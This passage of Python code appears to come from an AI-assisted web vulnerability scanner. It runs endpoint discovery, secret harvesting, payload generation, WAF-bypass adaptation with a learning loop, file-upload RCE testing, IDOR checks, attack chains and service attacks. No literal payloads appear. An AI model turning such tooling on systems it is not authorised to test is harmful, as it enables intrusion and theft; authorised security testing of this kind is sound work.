                self.context["rate_limit"] = min(self.context.get("rate_limit") or 10, new_limit)
                await self.log(db, "attack_routing",
                    f"Rate limiting detected — throttling to {new_limit} req/s", "warning")

            # Publish plan summary via WebSocket
            await self._publish({
                "type": "attack_plan",
                "actions_count": len(plan),
                "top_actions": plan[:5],
            })
        else:
            await self.log(db, "attack_routing", "No specific attack vectors identified — using default strategy")

    async def _phase_endpoint(self, db: AsyncSession):
        endpoint_mod = EndpointModule()
        base_url = self.context.get("base_url")
        endpoints = await endpoint_mod.run(
            self.context["domain"], self.context["subdomains"][:10], base_url=base_url, context=self.context
        )
        # Scope filter endpoints
        if hasattr(self, '_scope'):
            before = len(endpoints)
            endpoints = self._scope.filter_urls(endpoints)
            if before != len(endpoints):
                await self.log(db, "endpoint", f"Scope filter: {before} → {len(endpoints)} endpoints")
        self.context["endpoints"] = endpoints
        if endpoint_mod._auth_cookie:
            self.context["auth_cookie"] = endpoint_mod._auth_cookie
            await self.log(db, "endpoint", f"Auto-login successful, got session cookie")
        await self.log(db, "endpoint", f"Discovered {len(endpoints)} endpoints")

        # --- Save JS secret findings from endpoint module as Vulnerability records ---
        js_secret_findings = getattr(endpoint_mod, "_js_secret_findings", [])
        if js_secret_findings:
            sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                       "medium": Severity.MEDIUM, "low": Severity.LOW}
            scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
            scan = scan_result.scalar_one_or_none()
            js_saved = 0
            # Deduplicate by (url, secret_type)
            seen_js_secrets = set()
            for f in js_secret_findings:
                dedup_key = (f.get("url", ""), f.get("secret_type", ""))
                if dedup_key in seen_js_secrets:
                    continue
                seen_js_secrets.add(dedup_key)
                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=f"{f.get('title', 'Secret in JavaScript')} ({f.get('secret_masked', '')})"[:500],
                    vuln_type=VulnType.INFO_DISCLOSURE,
                    severity=sev_map.get(f.get("severity", "high"), Severity.HIGH),
                    url=f.get("url", "")[:2000],
                    description=f.get("impact", ""),
                    payload_used=f.get("payload"),
                    remediation=f.get("remediation"),
                    ai_confidence=0.95,
                    request_data=f.get("request_data", {}),
                    response_data=f.get("response_data", {}),
                )
                result = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                if result:
                    js_saved += 1
            if js_saved:
                await self.log(db, "endpoint",
                    f"JS secret scan: found {len(js_secret_findings)} secrets ({js_saved} new vulns saved)", "warning")

        # --- JavaScript endpoint extraction ---
        try:
            from app.modules.js_analyzer import JSAnalyzer
            js_analyzer = JSAnalyzer()
            js_result = await js_analyzer.extract_from_js_files(
                base_url or f"https://{self.context['domain']}",
                endpoints,
                context=self.context,
            )

            # Merge JS endpoints into context
            seen_urls = {ep.get("url", "") for ep in endpoints}
            js_added = 0
            for js_ep in js_result.get("js_endpoints", []):
                # Build full URL if relative
                if js_ep.startswith("/"):
                    full_url = (base_url or f"https://{self.context['domain']}") + js_ep
                else:
                    full_url = js_ep
                if full_url not in seen_urls:
                    seen_urls.add(full_url)
                    endpoints.append(endpoint_mod._classify_endpoint(full_url))
                    js_added += 1

            # Merge SPA routes
            for route in js_result.get("spa_routes", []):
                full_url = (base_url or f"https://{self.context['domain']}") + route
                if full_url not in seen_urls:
                    seen_urls.add(full_url)
                    ep = endpoint_mod._classify_endpoint(full_url)
                    ep["discovery"] = "js_spa"
                    endpoints.append(ep)
                    js_added += 1

            self.context["endpoints"] = endpoints

            # Store WebSocket endpoints in context
            ws_endpoints = js_result.get("websocket_endpoints", [])
            if ws_endpoints:
                self.context["websocket_endpoints"] = ws_endpoints

            # Report API keys as findings (save as Vulnerability DB records)
            api_keys = js_result.get("api_keys_found", [])
            if api_keys:
                for key_info in api_keys:
                    vuln = Vulnerability(
                        target_id=self.context["target_id"],
                        scan_id=self.context["scan_id"],
                        title=f"Exposed {key_info['type']} in JavaScript ({key_info['file']})"[:500],
                        vuln_type=VulnType.INFO_DISCLOSURE,
                        severity=Severity.MEDIUM if key_info["type"] in ("aws_key", "private_key") else Severity.LOW,
                        url=(base_url or f"https://{self.context['domain']}")[:2000],
                        description=(
                            f"A potential {key_info['type']} was found in client-side JavaScript file "
                            f"'{key_info['file']}'. Prefix: {key_info['key_prefix']}. "
                            f"Client-side secrets can be extracted by anyone viewing the page source."
                        ),
                        impact="Leaked credentials or API keys in client-side code can lead to unauthorized access.",
                        remediation="Move secrets to server-side configuration. Use environment variables or a secrets manager.",
                        request_data={"method": "GET", "url": key_info.get("file", "")},
                        response_data={"key_type": key_info["type"], "key_prefix": key_info.get("key_prefix", "")},
                    )
                    await self._save_vuln_deduped(db, vuln)

            # Report source maps as findings
            source_maps = js_result.get("source_maps", [])
            accessible_maps = [sm for sm in source_maps if sm.get("accessible")]
            if accessible_maps:
                for smap in accessible_maps:
                    orig_count = len(smap.get("original_files", []))
                    orig_files_str = ', '.join(smap.get('original_files', [])[:10])
                    vuln = Vulnerability(
                        target_id=self.context["target_id"],
                        scan_id=self.context["scan_id"],
                        title=f"Source map exposed: {smap['js_file']}"[:500],
                        vuln_type=VulnType.INFO_DISCLOSURE,
                        severity=Severity.LOW,
                        url=smap["url"][:2000],
                        description=(
                            f"JavaScript source map '{smap['url']}' is publicly accessible, "
                            f"exposing {orig_count} original source files. "
                            f"This reveals internal code structure and may contain sensitive logic. "
                            f"Original files: {orig_files_str}"
                        ),
                        impact="Source maps expose original unminified source code, revealing internal application logic, comments, and potentially sensitive information.",
                        remediation="Remove source map files from production or restrict access via server configuration.",
                        request_data={"method": "GET", "url": smap["url"]},
                        response_data={"original_files": smap.get("original_files", [])[:10], "accessible": True},
                    )
                    await self._save_vuln_deduped(db, vuln)

            await self.log(
                db, "endpoint",
                f"JS analysis: found {js_added} additional endpoints, "
                f"{len(api_keys)} API keys, {len(source_maps)} source maps"
            )
        except Exception as e:
            await self.log(db, "endpoint", f"JS analysis error (non-fatal): {e}")

        # --- API Discovery (GraphQL introspection, OpenAPI/Swagger, WADL/WSDL) ---
        try:
            api_base = base_url or f"https://{self.context['domain']}"
            api_disc = await run_api_discovery(api_base, self.context["endpoints"], self.context)

            # Merge discovered endpoints
            seen_urls = {ep.get("url", "") for ep in self.context["endpoints"]}
            api_added = 0
            for new_ep in api_disc.get("new_endpoints", []):
                ep_url = new_ep.get("url", "")
                ep_key = ep_url + ":" + new_ep.get("graphql_operation", "")
                if ep_key not in seen_urls:
                    seen_urls.add(ep_key)
                    self.context["endpoints"].append(new_ep)
                    api_added += 1

            # Save findings as Vulnerability DB records
            severity_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH, "medium": Severity.MEDIUM, "low": Severity.LOW, "info": Severity.INFO}
            vuln_type_map = {"misconfiguration": VulnType.MISCONFIGURATION, "info_disclosure": VulnType.INFO_DISCLOSURE}
            for finding in api_disc.get("findings", []):
                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=finding["title"][:500],
                    vuln_type=vuln_type_map.get(finding.get("vuln_type"), VulnType.MISCONFIGURATION),
                    severity=severity_map.get(finding.get("severity", "low"), Severity.LOW),
                    url=(finding.get("endpoint") or api_base)[:2000],
                    description=finding.get("description", ""),
                    remediation=finding.get("remediation", ""),
                    request_data=finding.get("request_data"),
                    response_data=finding.get("response_data"),
                )
                await self._save_vuln_deduped(db, vuln)

            # Store GraphQL schema in context for AI analysis
            if api_disc.get("graphql_schema"):
                self.context["graphql_schema"] = api_disc["graphql_schema"]

            # Store OpenAPI info in context
            if api_disc.get("openapi", {}).get("spec_url"):
                self.context["openapi_spec"] = api_disc["openapi"]

            # Log results
            gql = api_disc.get("graphql", {})
            oapi = api_disc.get("openapi", {})
            wadl = api_disc.get("wadl_wsdl", {})
            parts = []
            if gql.get("introspection_enabled"):
                parts.append(
                    f"GraphQL at {gql['endpoint']} ({len(gql.get('queries', []))} queries, "
                    f"{len(gql.get('mutations', []))} mutations)"
                )
            if oapi.get("spec_url"):
                parts.append(f"OpenAPI {oapi.get('version', '?')} at {oapi['spec_url']} ({oapi.get('endpoints_count', 0)} endpoints)")
            if wadl.get("found"):
                parts.append(f"{wadl.get('type', 'service').upper()} at {wadl['url']}")

            if parts:
                await self.log(db, "endpoint", f"API discovery: {'; '.join(parts)}")
            else:
                await self.log(db, "endpoint", "API discovery: no GraphQL/OpenAPI/WADL specs found")

            if api_added > 0:
                await self.log(db, "endpoint", f"API discovery added {api_added} new endpoints")
            await self.log(db, "endpoint",
                f"API discovery: {len(api_disc.get('findings', []))} security findings")

        except Exception as e:
            await self.log(db, "endpoint", f"API discovery error (non-fatal): {e}")

        # Re-run attack router with endpoint data to refine the plan
        router = AttackRouter()
        plan = router.analyze(self.context)
        new_actions = [a for a in plan if a.get("category") in ("auth", "api")]
        if new_actions:
            names = [f"{a['action']}" for a in new_actions[:3]]
            await self.log(db, "endpoint",
                f"Attack plan updated: +{len(new_actions)} actions from endpoints ({', '.join(names)})")

        # --- ID Harvesting ---
        try:
            from app.modules.id_harvester import IDHarvester
            from app.utils.http_client import make_client
            harvester = IDHarvester()
            harvester.harvest_from_endpoints(endpoints)

            # Also harvest from initial endpoint responses
            base_url = self.context.get("base_url")
            async with make_client() as client:
                for ep in endpoints[:50]:  # Sample up to 50 endpoints
                    try:
                        url = ep.get("url", "") if isinstance(ep, dict) else ep
                        if not url:
                            continue
                        resp = await client.get(url)
                        harvester.harvest_from_response(url, resp.text, resp.status_code)
                    except Exception:
                        continue

            self.context["id_harvester"] = harvester
            self.context["harvested_ids"] = harvester.to_dict()
            await self.log(db, "endpoint", f"ID harvesting: {harvester.summary()}")
        except Exception as e:
            await self.log(db, "endpoint", f"ID harvesting error (non-fatal): {e}")

    async def _phase_vuln_scan(self, db: AsyncSession):
        scanner = VulnerabilityScanner()
        vulns = await scanner.run(self.context)
        self.context["scan_results"] = vulns
        await self.log(db, "vuln_scan", f"Scanner found {len(vulns)} potential vulnerabilities")

        # --- Deep Security Header Analysis (CSP, CORS, Cookies, Headers) ---
        try:
            base_url = self.context.get("base_url", f"https://{self.context['domain']}")
            endpoints = self.context.get("endpoints", [])
            sec_findings = await run_security_analysis(base_url, endpoints, self.context)

            if sec_findings:
                severity_map = {
                    "critical": Severity.CRITICAL, "high": Severity.HIGH,
                    "medium": Severity.MEDIUM, "low": Severity.LOW, "info": Severity.INFO,
                }
                vt_map = {v.value: v for v in VulnType}
                saved = 0
                for f in sec_findings:
                    sev = severity_map.get(f.get("severity", "info"), Severity.INFO)
                    if sev == Severity.INFO:
                        continue  # Skip info-level findings — they're noise
                    vt = vt_map.get(f.get("vuln_type", "misconfiguration"), VulnType.MISCONFIGURATION)
                    vuln = Vulnerability(
                        target_id=self.context["target_id"],
                        scan_id=self.context["scan_id"],
                        title=f["title"][:500],
                        vuln_type=vt,
                        severity=sev,
                        url=(f.get("url") or base_url)[:2000],
                        description=f.get("impact", ""),
                        payload_used=f.get("payload", ""),
                        remediation=f.get("remediation", ""),
                        ai_analysis=f.get("csp_grade", ""),
                        request_data=f.get("request_data"),
                        response_data=f.get("response_data"),
                    )
                    result = await self._save_vuln_deduped(db, vuln)
                    if result:
                        saved += 1

                csp_grade = self.context.get("csp_analysis", {}).get("grade", "N/A")
                cors_count = self.context.get("cors_analysis", {}).get("findings_count", 0)
                await self.log(
                    db, "vuln_scan",
                    f"Security analysis: {saved} findings (CSP grade: {csp_grade}, CORS issues: {cors_count})",
                )
        except Exception as e:
            await self.log(db, "vuln_scan", f"Security header analysis error (non-fatal): {e}", "warning")

    async def _phase_ai_analysis(self, db: AsyncSession):
        orchestrator = AIOrchestrator()
        strategy = await orchestrator.analyze_and_plan(self.context)
        self.context["ai_strategy"] = strategy
        await self.log(db, "ai_analysis", f"AI planned {len(strategy.get('attack_plan', []))} attack vectors")

    async def _phase_payload_gen(self, db: AsyncSession):
        generator = PayloadGenerator()
        payloads = await generator.generate(self.context, db=db)

        # Inject knowledge-driven payloads from the knowledge base
        kb_payloads = await self._get_knowledge_payloads(db)
        if kb_payloads:
            payloads.extend(kb_payloads)
            await self.log(db, "payload_gen", f"Injected {len(kb_payloads)} knowledge-driven payloads")

        self.context["payloads"] = payloads
        await self.log(db, "payload_gen", f"Generated {len(payloads)} total payloads")

        # --- OOB Detection: inject blind-vuln callback payloads ---
        try:
            from app.modules.oob_server import inject_oob_payloads
            oob_count = await inject_oob_payloads(self.context, db)
            if oob_count:
                await self.log(db, "payload_gen",
                    f"OOB: injected {oob_count} out-of-band callback payloads for blind vuln detection")
        except Exception as e:
            await self.log(db, "payload_gen", f"OOB injection skipped: {e}", "warning")

    async def _phase_waf(self, db: AsyncSession):
        waf_mod = WAFModule()
        waf_mod._base_url = self.context.get("base_url", f"https://{self.context['domain']}")
        waf_info = await waf_mod.detect(self.context["domain"])
        self.context["waf_info"] = waf_info

        if waf_info.get("detected"):
            waf_name = waf_info.get("waf_name", "unknown")
            await self.log(db, "waf", f"WAF detected: {waf_name}", "warning")
            # Adapt payloads for WAF bypass
            adapted = await waf_mod.adapt_payloads(self.context["payloads"], waf_info)

            # --- WAF Intelligence: query known effective bypasses ---
            from app.core.waf_intelligence import WAFIntelligence
            waf_intel = WAFIntelligence()
            intel_count = 0
            try:
                # Get WAF profile for logging
                waf_profile = await waf_intel.get_waf_profile(waf_name, db)
                if waf_profile.get("total_attempts", 0) > 0:
                    bypass_rate = waf_profile.get("overall_bypass_rate", 0)
                    await self.log(db, "waf",
                        f"WAF Intelligence: {waf_profile['total_attempts']} past attempts, "
                        f"{bypass_rate:.0%} bypass rate, "
                        f"{len(waf_profile.get('bypass_techniques', []))} known techniques")

                # Collect vuln types from current payloads
                vuln_types = set()
                for p in self.context["payloads"]:
                    vt = p.get("vuln_type", p.get("type", ""))
                    if vt:
                        vuln_types.add(vt)
                if not vuln_types:
                    vuln_types = {"xss", "sqli", "generic"}

                # Query known bypasses per vuln type
                for vt in vuln_types:
                    effective = await waf_intel.get_effective_bypasses(waf_name, vt, db)
                    for payload_str in effective:
                        adapted.append({
                            "payload": payload_str,
                            "vuln_type": vt,
                            "type": vt,
                            "source": "waf_intelligence",
                            "waf_bypass": True,
                        })
                        intel_count += 1

                # Generate mutations for blocked payloads from past experience
                blocked = [
                    bp for bp in waf_profile.get("blocked_patterns", [])
                    if bp.get("success_rate", 0) < 0.1
                ]
                for bp in blocked[:10]:
                    mutations = waf_intel.generate_mutations(
                        waf_name, bp.get("payload", ""), bp.get("vuln_type", "")
                    )
                    for m in mutations[:3]:
                        adapted.append({
                            "payload": m,
                            "vuln_type": bp.get("vuln_type", "generic"),
                            "type": bp.get("vuln_type", "generic"),
                            "source": "waf_intelligence_mutation",
                            "waf_bypass": True,
                        })
                        intel_count += 1
            except Exception as e:
                await self.log(db, "waf", f"WAF Intelligence query error: {e}", "warning")

            # Also inject legacy knowledge-driven WAF bypass patterns
            from app.models.knowledge import KnowledgePattern
            kb_result = await db.execute(
                select(KnowledgePattern).where(
                    KnowledgePattern.pattern_type == "waf_bypass",
                    KnowledgePattern.confidence >= 0.4,
                ).order_by(KnowledgePattern.confidence.desc()).limit(50)
            )
            kb_bypasses = kb_result.scalars().all()
            kb_count = 0
            for bp in kb_bypasses:
                data = bp.pattern_data or {}
                # Match WAF name if specified
                bp_waf = data.get("waf", "").lower()
                if bp_waf and bp_waf not in waf_name.lower():
                    continue
                bypass_payloads = data.get("payloads", [])
                if isinstance(bypass_payloads, list):
                    for pl in bypass_payloads[:5]:
                        adapted.append({
                            "payload": pl if isinstance(pl, str) else str(pl),
                            "type": bp.vuln_type or "generic",
                            "source": "knowledge_waf_bypass",
                        })
                        kb_count += 1

            self.context["payloads"] = adapted
            await self.log(db, "waf",
                f"Adapted {len(adapted)} payloads for WAF bypass "
                f"(+{intel_count} from WAF Intelligence, +{kb_count} from knowledge)")
        else:
            await self.log(db, "waf", "No WAF detected")

    async def _phase_nuclei(self, db: AsyncSession):
        nuclei_mod = NucleiModule()
        findings = await nuclei_mod.run(self.context)
        # Merge nuclei findings into scan_results so AI/exploit phases can use them
        existing = self.context.get("scan_results", [])
        existing.extend(findings)
        self.context["scan_results"] = existing
        await self.log(db, "nuclei", f"Nuclei found {len(findings)} additional findings")

    async def _phase_exploit(self, db: AsyncSession):
        exploiter = Exploiter()
        results = await exploiter.run(self.context, db)

        # --- File Upload Exploitation ---
        try:
            from app.modules.upload_exploit import UploadExploit
            upload_exploiter = UploadExploit()
            endpoints = self.context.get("endpoints", [])
            upload_findings = await upload_exploiter.test_all(endpoints, self.context)
            if upload_findings:
                upload_vulns = await exploiter._save_module_findings(
                    upload_findings, self.context, db,
                )
                results.extend(upload_vulns)
                await self.log(
                    db, "exploit",
                    f"File upload exploit: {len(upload_vulns)} findings "
                    f"({sum(1 for f in upload_findings if f.get('execution_confirmed'))} RCE confirmed)",
                )
                await db.flush()
        except Exception as e:
            await self.log(db, "exploit", f"File upload exploit error: {e}", "warning")

        # --- Smart IDOR Testing ---
        try:
            from app.modules.idor_engine import IDOREngine
            idor_engine = IDOREngine(rate_limit=exploiter.rate_limit)
            endpoints = self.context.get("endpoints", [])
            # Pass harvested IDs from endpoint phase if available
            if self.context.get("harvested_ids"):
                idor_engine.harvested_ids = self.context["harvested_ids"]
            idor_findings = await idor_engine.test_all(endpoints, self.context)
            if idor_findings:
                # Save proven IDOR findings directly as Vulnerability records
                severity_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH, "medium": Severity.MEDIUM, "low": Severity.LOW, "info": Severity.INFO}
                idor_saved = 0
                idor_types = {}
                for f in idor_findings:
                    proof = f.get("proof", {})
                    if not proof.get("proven") and not f.get("proven"):
                        continue  # Skip unproven findings
                    # In-memory dedup
                    dedup_key = f"{f.get('url', '')}|{f.get('param', '')}|{f.get('idor_type', '')}"
                    if dedup_key in self._idor_seen:
                        continue
                    self._idor_seen.add(dedup_key)

                    vuln = Vulnerability(
                        target_id=self.context["target_id"],
                        scan_id=self.context["scan_id"],
                        title=f.get("title", "IDOR vulnerability")[:500],
                        vuln_type=VulnType.AUTH_BYPASS,
                        severity=severity_map.get(f.get("severity", "high"), Severity.HIGH),
                        url=f.get("url", "")[:2000],
                        parameter=f.get("param"),
                        method=f.get("method", "GET"),
                        description=f.get("description", f.get("evidence", "")),
                        impact=f.get("impact", ""),
                        remediation=f.get("remediation", "Implement proper authorization checks."),
                        payload_used=f.get("payload", f.get("tampered_value")),
                        request_data=proof.get("request"),
                        response_data=proof.get("response"),
                        ai_confidence=0.9,
                    )
                    result = await self._save_vuln_deduped(db, vuln)
                    if result:
                        idor_saved += 1
                    t = f.get("idor_type", "unknown")
                    idor_types[t] = idor_types.get(t, 0) + 1
                await self.log(
                    db, "exploit",
                    f"Smart IDOR: {idor_saved} proven findings ({idor_types})",
                )
        except Exception as e:
            await self.log(db, "exploit", f"Smart IDOR error: {e}", "warning")

        # Filter out known false positives before saving
        results = await self._filter_false_positives(results, db, "exploit")

        # --- WAF Intelligence: learn from exploit results ---
        waf_info = self.context.get("waf_info") or {}
        if waf_info.get("detected"):
            waf_name = waf_info.get("waf_name", "unknown")
            try:
                from app.core.waf_intelligence import WAFIntelligence
                waf_intel = WAFIntelligence()
                recorded = 0

                # Record successful bypasses from confirmed vulnerabilities
                for vuln in results:
                    payload = vuln.get("payload_used") or vuln.get("payload", "")
                    vt = vuln.get("vuln_type", "unknown")
                    if payload:
                        await waf_intel.record_bypass(
                            waf_name=waf_name,
                            payload=payload,
                            vuln_type=vt,
                            success=True,
                            response_code=200,
                            db=db,
                        )
                        recorded += 1

                # Record failed attempts (payloads that were tried but didn't find vulns)
                # We track waf_bypass payloads that were NOT in results
                successful_payloads = set()
                for vuln in results:
                    p = vuln.get("payload_used") or vuln.get("payload", "")
                    if p:
                        successful_payloads.add(p)

                for p_data in self.context.get("payloads", []):
                    if not p_data.get("waf_bypass"):
                        continue
                    payload = p_data.get("payload", "")
                    if payload and payload not in successful_payloads:
                        vt = p_data.get("vuln_type", p_data.get("type", "generic"))
                        await waf_intel.record_bypass(
                            waf_name=waf_name,
                            payload=payload,
                            vuln_type=vt,
                            success=False,
                            response_code=403,
                            db=db,
                        )
                        recorded += 1

                if recorded:
                    await self.log(db, "exploit",
                        f"WAF Intelligence: recorded {recorded} bypass attempts for {waf_name}")
                    await db.flush()
            except Exception as e:
                await self.log(db, "exploit", f"WAF Intelligence recording error: {e}", "warning")

        # Apply bounty filter if in bounty mode
        if self.context.get("bounty_mode") and self.context.get("bounty_rules"):
            from app.core.bounty_filter import get_bounty_filter
            bf = get_bounty_filter(self.context["bounty_rules"])
            in_scope, out_of_scope = bf.filter_findings(results)
            if out_of_scope:
                await self.log(db, "exploit",
                    f"Bounty filter: removed {len(out_of_scope)} OOS findings, kept {len(in_scope)}")
            results = in_scope

        self.context["vulnerabilities"] = results
        await self.log(db, "exploit", f"Confirmed {len(results)} vulnerabilities", "success")

        # --- Real-time Learning: learn from each confirmed vuln ---
        if results:
            total_mutations = 0
            try:
                for vuln_data in results:
                    mutations = await self.realtime_learner.on_vuln_confirmed(
                        vuln_data, self.context, db,
                    )
                    total_mutations += len(mutations)
                if total_mutations:
                    await self.log(db, "exploit",
                        f"Real-time learner: generated {total_mutations} mutations from "
                        f"{len(results)} confirmed vulns")
                await db.flush()
            except Exception as e:
                await self.log(db, "exploit",
                    f"Real-time learning error: {e}", "warning")

        # --- Real-time Strategy Adaptation ---
        try:
            adjustments = await self.realtime_learner.adapt_strategy(self.context, db)
            notes = adjustments.get("notes", [])
            if notes:
                for note in notes:
                    await self.log(db, "exploit", f"Strategy: {note}")
            await db.flush()
        except Exception as e:
            await self.log(db, "exploit",
                f"Strategy adaptation error: {e}", "warning")

        # --- Multi-Step Attack Chain Engine ---
        if self.context.get("vulnerabilities"):
            try:
                from app.modules.attack_chain import AttackChainModule, select_chains

                chain_mod = AttackChainModule()
                chain_results = await chain_mod.run_chains(self.context)

                if chain_results:
                    self.context["attack_chains"] = chain_results

                    # Save verified chain results as additional Vulnerability records
                    scan_result = await db.execute(
                        select(Scan).where(Scan.id == self.context["scan_id"])
                    )
                    scan_obj = scan_result.scalar_one_or_none()
                    sev_map = {
                        "critical": Severity.CRITICAL, "high": Severity.HIGH,
                        "medium": Severity.MEDIUM, "low": Severity.LOW,
                    }

                    chains_saved = 0
                    saved_chain_names = set()  # Deduplicate by chain name
                    for chain in chain_results:
                        # Only save VERIFIED chains — unverified are noise
                        if not chain.get("verified"):
                            continue

                        # Deduplicate: one finding per chain type
                        chain_name = chain.get("chain_name") or chain.get("template_id", "")
                        if chain_name in saved_chain_names:
                            continue
                        saved_chain_names.add(chain_name)

                        chain_severity = sev_map.get(
                            chain.get("severity", "high"), Severity.HIGH
                        )
                        trigger_type = chain.get("trigger_vuln", {}).get("type", "")
                        trigger_url = chain.get("trigger_vuln", {}).get("url", "")

                        # Build description from evidence
                        evidence_lines = []
                        for ev in chain.get("evidence", []):
                            if isinstance(ev, dict):
                                evidence_lines.append(
                                    f"Step {ev.get('step', '?')}: {ev.get('action', '')} "
                                    f"-> {ev.get('result', '')}"
                                )

                        description = (
                            f"Multi-step attack chain: {chain.get('chain_name', 'Unknown')}\n\n"
                            + "\n".join(evidence_lines)
                            + f"\n\nSteps completed: {chain.get('steps_completed', 0)}"
                            f"/{chain.get('steps_total', 0)}"
                        )

                        recommendations = chain.get("recommendations", [])
                        remediation = "\n".join(
                            f"- {r}" for r in recommendations
                        ) if recommendations else None

                        vuln = Vulnerability(
                            target_id=self.context["target_id"],
                            scan_id=self.context["scan_id"],
                            title=f"Attack Chain: {chain.get('chain_name', 'Unknown')}"[:500],
                            vuln_type=VulnType.OTHER,
                            severity=chain_severity,
                            url=trigger_url[:2000] if trigger_url else "",
                            method="GET",
                            description=description,
                            impact=chain.get("impact", ""),
                            remediation=remediation,
                            ai_confidence=0.85 if chain.get("verified") else 0.6,
                            request_data={
                                "chain_template": chain.get("template_id", ""),
                                "trigger_type": trigger_type,
                                "steps_completed": chain.get("steps_completed", 0),
                                "steps_total": chain.get("steps_total", 0),
                                "evidence": chain.get("evidence", []),
                            },
                        )
                        result = await self._save_vuln_deduped(db, vuln, scan=scan_obj)
                        if result:
                            chains_saved += 1

                    succeeded = sum(
                        1 for c in chain_results if c.get("verified")
                    )
                    await self.log(
                        db, "exploit",
                        f"Attack chains: executed {len(chain_results)} chains, "
                        f"{succeeded} verified, {chains_saved} saved as vulns",
                        "warning" if succeeded > 0 else "info",
                    )
                else:
                    await self.log(
                        db, "exploit",
                        "Attack chains: no applicable chains for current vulns",
                    )
            except Exception as e:
                await self.log(
                    db, "exploit",
                    f"Attack chain engine error: {e}", "warning",
                )

        # --- Access Control Verification ---
        try:
            from app.modules.access_control_prover import AccessControlProver
            prover = AccessControlProver(self.context)
            ac_findings = await prover.prove_all(self.context.get("endpoints", []), db)

            severity_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH, "medium": Severity.MEDIUM, "low": Severity.LOW}

            for finding in ac_findings:
                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=finding["title"][:500],
                    vuln_type=VulnType.AUTH_BYPASS,
                    severity=severity_map.get(finding.get("severity", "high"), Severity.HIGH),
                    url=finding.get("url", "")[:2000],
                    parameter=finding.get("param"),
                    method=finding.get("method", "GET"),
                    description=finding.get("description", ""),
                    impact=finding.get("impact", ""),
                    remediation=finding.get("remediation", ""),
                    payload_used=finding.get("payload_used"),
                    request_data=finding.get("proof", {}).get("request"),
                    response_data=finding.get("proof", {}).get("response"),
                )
                await self._save_vuln_deduped(db, vuln)

            await self.log(db, "exploit", f"Access control prover: {len(ac_findings)} proven vulnerabilities")
        except Exception as e:
            await self.log(db, "exploit", f"Access control prover error (non-fatal): {e}")

        # --- OOB Detection: wait for callbacks and check results ---
        try:
            from app.modules.oob_server import check_oob_results, OOB_HOST
            if OOB_HOST:
                await self.log(db, "exploit", "OOB: waiting 10s for out-of-band callbacks...")
                await asyncio.sleep(10)

                oob_results = await check_oob_results(self.scan_id, db)
                if oob_results:
                    scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
                    scan_obj = scan_result.scalar_one_or_none()
                    sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                               "medium": Severity.MEDIUM, "low": Severity.LOW}
                    vtype_map = {
                        "ssrf": VulnType.SSRF, "xxe": VulnType.XXE,
                        "cmd_injection": VulnType.CMD_INJECTION, "ssti": VulnType.SSTI,
                    }

                    for oob_vuln in oob_results:
                        vt = vtype_map.get(oob_vuln.get("vuln_type", ""), VulnType.SSRF)
                        vuln = Vulnerability(
                            target_id=self.context["target_id"],
                            scan_id=self.context["scan_id"],
                            title=oob_vuln.get("title", "Blind vuln via OOB")[:500],
                            vuln_type=vt,
                            severity=sev_map.get(oob_vuln.get("severity", "high"), Severity.HIGH),
                            url=oob_vuln.get("url", "")[:2000],
                            method="GET",
                            description=oob_vuln.get("description", ""),
                            ai_confidence=oob_vuln.get("ai_confidence", 0.95),
                            request_data=oob_vuln.get("request_data"),
                            response_data=oob_vuln.get("response_data", {"oob_callback": oob_vuln.get("callback_data")}),
                        )
                        await self._save_vuln_deduped(db, vuln, scan=scan_obj, track_context=True, finding_dict=oob_vuln)
                    await self.log(db, "exploit",
                        f"OOB: confirmed {len(oob_results)} blind vulnerabilities via callbacks!", "success")
                else:
                    await self.log(db, "exploit", "OOB: no out-of-band callbacks received")

                # Stop the OOB server after checking
                try:
                    from app.modules.oob_server import stop_oob_server
                    await stop_oob_server()
                except Exception as e:
                    logger.debug(f"OOB server stop failed (non-fatal): {e}")
        except Exception as e:
            await self.log(db, "exploit", f"OOB check error: {e}", "warning")

    async def _phase_sensitive_files(self, db: AsyncSession):
        """Discover exposed sensitive files, configs, backups."""
        sem = asyncio.Semaphore(self.context.get("rate_limit") or 10)
        mod = SensitiveFilesModule(rate_limit=sem)
        findings = await mod.run(self.context)
        # Filter out known false positives
        if findings:
            findings = await self._filter_false_positives(findings, db, "sensitive_files")
        if findings:
            scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
            scan = scan_result.scalar_one_or_none()
            sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                       "medium": Severity.MEDIUM, "low": Severity.LOW}

            saved = 0
            for f in findings:
                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=f.get("title", "Sensitive file exposed")[:500],
                    vuln_type=VulnType.INFO_DISCLOSURE,
                    severity=sev_map.get(f.get("severity", "medium"), Severity.MEDIUM),
                    url=f.get("url", "")[:2000],
                    method=f.get("method", "GET"),
                    description=f.get("impact", ""),
                    payload_used=f.get("payload"),
                    remediation=f.get("remediation"),
                    ai_confidence=0.9,
                    request_data=f.get("request_data", {"method": f.get("method", "GET"), "url": f.get("url", "")}),
                    response_data=f.get("response_data"),
                )
                result = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                if result:
                    saved += 1

            await self.log(db, "sensitive_files",
                f"Found {len(findings)} sensitive files ({saved} new, {len(findings) - saved} deduped)", "warning")
        else:
            await self.log(db, "sensitive_files", "No exposed sensitive files found")

    async def _phase_service_attack(self, db: AsyncSession):
        """Attack discovered services — SSH, FTP, Redis, databases, etc."""
        sem = asyncio.Semaphore(self.context.get("rate_limit") or 5)
        mod = ServiceAttackModule(rate_limit=sem)
        findings = await mod.run(self.context)
        # Filter out known false positives
        if findings:
            findings = await self._filter_false_positives(findings, db, "service_attack")
        if findings:
            # Service attack findings are confirmed vulns — add directly
            scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
            scan = scan_result.scalar_one_or_none()
